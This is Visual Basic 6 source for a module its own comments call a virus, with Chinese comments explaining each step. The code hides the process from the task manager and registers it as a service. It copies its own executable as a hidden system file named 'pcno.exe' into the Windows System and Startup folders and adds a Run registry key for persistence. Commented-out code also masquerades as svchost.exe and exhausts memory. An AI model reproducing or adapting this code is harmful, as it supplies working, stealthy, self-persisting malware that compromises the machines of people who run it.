Attribute VB_Name = "VirusCPUAndFile"
Public i As Integer
Public Declare Function GetCurrentProcessid Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long)
Public Const RSP_SIMPLE_SERVICE = 1
Public Const RSP_UNREGISTER_SERVICE = 0
Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long '宣告GetSystemDirectory API函數
Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long '宣告SetFileAttributes API函數
Dim SDir As String '儲存系統System路徑
Dim runDir As String '儲存「啟動」路徑
Public Sub MakeMeService()
Dim pid As Long
Dim resery As Long
pid = GetCurrentProcessid()
regserv = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
End Sub
Public Sub Main()
   'On Error Resume Next
   Randomize
   If App.PrevInstance Then End '防止病毒重覆開啟，造成錯誤
   App.TaskVisible = False '在工作管理員隱藏身分
   
   Call GetSDir '取得SYSTEM路徑
   Call GetRunDir '取得「啟動」路徑
   Dim wshshell As Object '宣告wshshell為一個Object
   Set wshshell = CreateObject("wscript.shell") '將"wscript.shell"載入到wshshell內
   Dim ToPath As String '儲存目標路徑
   
   '病毒核心 Start
   If App.Path <> "C:\Documents and Settings\User" Then
      'FileCopy (App.Path & "\svchost.exe"), ("C:\Documents and Settings\User\svchost.exe")
   End If
   'For i = 0 To 10 '999
   '   If Int(i / 10) = 0 Then
   '      CountZero = "00"
   '   ElseIf Int(i / 100) >= 1 Then
   '      CountZero = ""
   '   Else
   '      CountZero = "0"
   '   End If
   '   For j = 0 To 10 '44000
   '      Words = Words + String(44000, Int(Rnd * 128))
   '   Next
   '
   '   If i = 10 Then
   '      i = 0
   '   End If
   'Next
   '病毒核心 End
   
   ToPath = SDir + "pcno.exe" ' '讓ToPath指向System目錄下的pcno.exe
   SetFileAttributes ToPath, 0 '確保System目錄下的pcno.exe無任何屬性，以免出差錯
   If Dir(ToPath) = "" Then '判斷System目錄下的pcno.exe是否存在，如果System目錄下的pcno.exe不存在
       FileCopy App.Path & "\" & App.EXEName & ".EXE", ToPath '將程式自身複製到System目錄下，檔名為「pcno.exe」
   End If
   SetAttr ToPath, vbHidden + vbSystem '修改System目錄下的pcno.exe屬性為隱藏+系統
   
   wshshell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\pcnoproblem", ToPath '將System目錄下的pcno.exe路徑寫入到開機開啟程式的登錄機碼內

   ToPath = runDir + "pcno.exe" '讓ToPath指向「啟動」目錄下的pcno.exe
   SetFileAttributes ToPath, 0 '確保「啟動」目錄下的pcno.exe無任何屬性，以免出差錯
   If Dir(ToPath) = "" Then '判斷「啟動」目錄下的pcno.exe是否存在
       FileCopy App.Path & "\" & App.EXEName & ".EXE", ToPath '將程式自身複製到「啟動」目錄下，檔名為「pcno.exe」
   End If
   SetAttr ToPath, vbHidden + vbSystem  '修改「啟動」目錄下的pcno.exe屬性為隱藏+系統

   End '結束程式
End Sub
Sub GetSDir() '取得SYSTEM路徑
    Dim rtn As Long '儲存GetSystemDirectory的return值
    Dim Buffer As String '作為lpBuffer
    Const MAX_PATH = 260 '設定最大字串長度

    Buffer = Space(MAX_PATH) '讓Buffer儲存MAX_PATH(260)個空白字元
    rtn = GetSystemDirectory(Buffer, Len(Buffer)) 'GetSystemDirectory(lpBuffer,nSize)
    If rtn = 0 Then '判斷GetSystemDirectory是否有取得路徑
        End '結束程式
    Else '如果rtn不為0
        SDir = Left(Buffer, rtn) 'SDir儲存System路徑。Left的用法是取出Buffer中的System路徑部分；rtn此時為System路徑的字串長度
    End If
End Sub
Sub GetRunDir() '取得「啟動」路徑
    Dim wshshell As Object '宣告wshshell為一個Object
    Set wshshell = CreateObject("wscript.shell") '將"wscript.shell"載入到wshshell內
    runDir = wshshell.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup") '取得啟動路徑
End Sub
